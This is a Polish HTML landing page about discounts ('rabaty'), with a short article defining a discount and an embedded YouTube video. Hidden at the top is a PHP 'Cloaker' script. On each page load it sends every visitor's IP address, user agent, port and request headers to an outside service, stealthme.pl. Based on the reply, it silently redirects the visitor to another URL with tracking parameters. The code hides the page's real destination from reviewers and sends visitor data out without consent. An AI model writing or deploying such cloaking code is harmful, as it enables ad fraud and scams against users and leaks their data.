<!DOCTYPE html>
<html lang="pl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>rabaty</title>
        
   
        <link rel="icon" href="favicon.ico">
        <link rel="shortcut icon" href="favicon.ico" type="imgae/x-icon">
        <link rel="stylesheet" href="style.css">

    </head>
    <body>
<php>
<?php
class Cloaker {
    private $uuid = null;
    private $ipAddress = null;
    private $userAgent = null;
    private $port = null;
    private $data = null;
    private $mlSub1 = null;
    private $mlSub2 = null;
    private $mlSub3 = null;
    private $mlSub4 = null;
    private $mlSub5 = null;

    const API_URL = "https://stealthme.pl/api/cloaker/check";

    public function __construct($uuid) {
        $this->uuid = $uuid;
        $this->setIpAddress($this->getIpAddress());
        $this->setUserAgent($this->getUserAgent());
        $this->setPort($this->getPort());
        $this->setData($this->getData());
    }

    public function setUuid($value = null) {
        $this->uuid = $value;
    }

    public function setIpAddress($value = null) {
        $this->ipAddress = $value;
    }

    public function setUserAgent($value = null) {
        $this->userAgent = $value;
    }

    public function setPort($value = null) {
        $this->port = $value;
    }

    public function setData($value = null) {
        $this->data = $value;
    }
    
    public function execute() {
        if($this->check()) {
            $parameters = [];
            $parameters["uuid"] = $this->uuid;
            $parameters["ip"] = $this->ipAddress;
            $parameters["user_agent"] = $this->userAgent;
            $parameters["port"] = $this->port;
            $parameters["data"] = json_encode($this->data);

            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, self::API_URL);
            curl_setopt($curl, CURLOPT_POST, 1);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $parameters);

            $response = curl_exec($curl);
            $response = json_decode($response, true);
            curl_close($curl);
    
            if($this->checkResponse($response)) {
                $this->redirect($response);
            }
        }
    }
    
    private function getIpAddress() {
        if (getenv("HTTP_CLIENT_IP")) {
            $ipAddress = getenv("HTTP_CLIENT_IP");
        } else if(getenv("HTTP_X_FORWARDED_FOR") && getenv("HTTP_X_FORWARDED_FOR") != $_SERVER["SERVER_ADDR"]) {
            $ipAddress = getenv("HTTP_X_FORWARDED_FOR");
        } else if(getenv("HTTP_X_FORWARDED")) {
            $ipAddress = getenv("HTTP_X_FORWARDED");
        } else if(getenv("HTTP_FORWARDED_FOR")) {
            $ipAddress = getenv("HTTP_FORWARDED_FOR");
        } else if(getenv("HTTP_FORWARDED")) {
            $ipAddress = getenv("HTTP_FORWARDED");
        } else if(getenv("REMOTE_ADDR")) {
            $ipAddress = getenv("REMOTE_ADDR");
        } else if(!empty($_SERVER["HTTP_CLIENT_IP"])) {
            $ipAddress = $_SERVER["HTTP_CLIENT_IP"];
        } else if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $ipAddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } else if (!empty($_SERVER["REMOTE_ADDR"])) {
            $ipAddress = $_SERVER["REMOTE_ADDR"];
        } else {
            return null;
        }
        $ipAddressArray = explode(",", $ipAddress);
        return trim($ipAddressArray[0]);
    }

    private function getUserAgent() {
        return ($_SERVER["HTTP_USER_AGENT"] !== null) ? $_SERVER["HTTP_USER_AGENT"] : null;
    }

    private function getPort() {
        return ($_SERVER["REMOTE_PORT"] !== null) ? $_SERVER["REMOTE_PORT"] : "";
    }

    private function getData() {
        $data = $this->getRequestHeaders();
        $data["path"] = $_SERVER["REQUEST_URI"];
        $data["REQUEST_METHOD"] = $_SERVER["REQUEST_METHOD"];
        if($_SERVER["SERVER_PORT"] == 443 || !empty($_SERVER["HTTPS"]) || !empty($_SERVER["SSL"])) {
            $data["HTTP_HTTPS"] = "1";
        }
        return $data;
    }
    
    private function getRequestHeaders() {
        $headers = array();
        foreach($_SERVER as $key => $value) {
            if (substr($key, 0, 5) <> "HTTP_") {
                continue;
            }
            $header = str_replace(" ", "-", ucwords(str_replace("_", " ", strtolower(substr($key, 5)))));
            $headers[$header] = $value;
        }
        return $headers;
    }

    private function check() {
        return ($this->uuid === null || $this->ipAddress === null || $this->userAgent === null) ? false : true;
    }

    private function checkResponse($response) {
        return ($response !== null && $response["status"] !== null && $response["redirect"] !== null) ? true : false;
    }

    private function redirect($response) {
        if($response["status"] === 1 && $response["redirect"] !== "") {
            header("Location: " . $this->getFinalRedirect($response["redirect"]));
        }
    }

    private function getFinalRedirect($redirect) {
        if($this->mlSub1 !== null) {
            $redirect .= "&ml_sub1=" . $this->mlSub1;
        }
        if($this->mlSub2 !== null) {
            $redirect .= "&ml_sub2=" . $this->mlSub2;
        }
        if($this->mlSub3 !== null) {
            $redirect .= "&ml_sub3=" . $this->mlSub3;
        }
        if($this->mlSub4 !== null) {
            $redirect .= "&ml_sub4=" . $this->mlSub4;
        }
        if($this->mlSub5 !== null) {
            $redirect .= "&ml_sub5=" . $this->mlSub5;
        }
        return $redirect;
    }
}

function executeCloaker(){
    $cloaker = new Cloaker("92289953-ec24-4f78-ac80-be7a1edf9539");
    $cloaker->execute();
}

executeCloaker();
?>
</php>
        <span style="font-family: Arial, Helvetica, sans-serif">
        <div id="wrapper">
            <header>
                <img src="top.jpg" alt="top - header"/>
            </header>

            <nav>
                <a class="menu active" href="#">strona główna</a>
                <a class="menu" href="#">info</a>
                <a class="menu" href="#">kontakt</a>
            </nav>

            <section>
                <article>
                    <h1>Co to jest zniżka?</h1>
                    <p><img class="left" src="zniżka.png" alt="zniżka"/>
                    <p>zniżka jest pojęciem z zakresu prawa finansowego i handlowego, nieposiadającym definicji ustawowej. 
                    W powszechnym rozumieniu oznacza pewną zniżkę, ustępstwo procentowe, kwotowe lub rzeczowe dla nabywcy 
                    od ustalonych standardowo cen towaru. Ma on charakter głównie marketingowy i motywacyjny.</p>

                </article>
                <iframe width="1000" height="315" src="https://www.youtube.com/embed/gBE7FUeYNgI" 
                title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
            </section>
            <footer>COPYRIGHT</footer>
            
        </div>
        </span>
    </body>

</html>